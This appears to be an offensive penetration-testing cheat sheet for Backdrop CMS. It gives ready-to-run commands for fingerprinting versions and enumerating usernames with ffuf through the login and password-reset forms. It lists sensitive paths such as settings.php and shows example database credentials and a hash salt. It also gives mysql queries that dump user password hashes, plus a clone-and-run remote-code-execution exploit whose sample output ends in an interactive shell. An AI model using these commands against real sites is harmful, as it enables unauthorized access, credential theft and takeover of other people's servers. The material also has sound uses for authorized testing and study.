# Backdrop CMS

Backdrop CMS is a fork of Drupal 7, designed for simplicity. Many Drupal concepts apply.

## Discovery

```bash
# Generator meta tag
curl -s http://TARGET | grep -i 'backdrop'
# Look for: Backdrop CMS 1 (https://backdropcms.org)

# Nmap script detection
nmap -sC -sV TARGET
# http-generator: Backdrop CMS 1

# robots.txt common entries
curl http://TARGET/robots.txt
# /core/ /profiles/ /README.md /admin /user/login /user/register
```

---

## Version Detection

```bash
# Via module .info files
curl http://TARGET/core/modules/redirect/redirect.info

# Output:
# project = backdrop
# version = 1.27.1
# timestamp = 1709862662

# Alternative locations
curl http://TARGET/core/modules/node/node.info
curl http://TARGET/core/modules/system/system.info
```

---

## Username Enumeration

### Login Form Enumeration

Backdrop returns different error messages for valid vs invalid usernames:
- Invalid username: `"Sorry, unrecognized username."`
- Valid username, wrong password: `"Sorry, incorrect password."`

```bash
# ffuf username enumeration via login
ffuf -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "name=FUZZ&pass=invalid&form_build_id=form-xxx&form_id=user_login&op=Log+in" \
    -u "http://TARGET/?q=user/login" \
    -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ \
    -fr "Sorry, unrecognized username."
```

### Password Reset Enumeration

```bash
# ffuf username enumeration via password reset
ffuf -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "name=FUZZ&form_build_id=form-xxx&form_id=user_pass&op=Reset+password" \
    -u "http://TARGET/?q=user/password" \
    -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ \
    -fr "is not recognized as a user name or an email address."
```

**Note:** Update `form_build_id` from a fresh page request. Rate limiting may kick in after too many attempts.

---

## Important Paths

| Path | Description |
|------|-------------|
| `/?q=user/login` | Login page |
| `/?q=user/password` | Password reset |
| `/?q=admin` | Admin panel |
| `/settings.php` | Database credentials |
| `/files/config_*/active/` | Configuration JSON files |
| `/files/config_*/staging/` | Staging config files |
| `/core/modules/` | Core modules directory |
| `/modules/` | Custom/contrib modules |

---

## Configuration Files

### settings.php

```bash
# Database connection string format
$database = 'mysql://root:password@127.0.0.1/backdrop';

# Config directories
$config_directories['active'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active';
$config_directories['staging'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/staging';

# Hash salt
$settings['hash_salt'] = 'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ';
```

### Config Directory Enumeration

```bash
# Find user-related config
find . | grep config_ | grep user

# Useful config files
./files/config_*/active/user.mail.json           # Email templates
./files/config_*/active/user.role.administrator.json  # Admin role perms
./files/config_*/active/update.settings.json     # May contain emails
```

---

## Database

Backdrop uses Drupal-style password hashing (salted stretched SHA-512).

```bash
# Connect with discovered credentials
mysql -u root -h 127.0.0.1 -pBackDropJ2024DS2024

# Enumerate users
use backdrop;
select name,pass from users;

# Hash format: $S$E...
# Not directly crackable with hashcat (custom algorithm)
```

---

## Authenticated RCE (Module Upload)

**Requires:** Admin or user with module upload permissions

### Automated Exploit

```bash
# Clone exploit
git clone https://github.com/rvizx/backdrop-rce

# Run exploit
python3 exploit.py http://TARGET username password

# Output:
# [>] logging in as user: 'username'
# [>] login successful
# [>] enabling maintenance mode
# [>] uploading payload
# [>] shell is live
# [>] interactive shell – type 'exit' to quit
```

**Reference:** https://github.com/rvizx/backdrop-rce

---

## References

- https://backdropcms.org/
- https://github.com/rvizx/backdrop-rce
- https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS
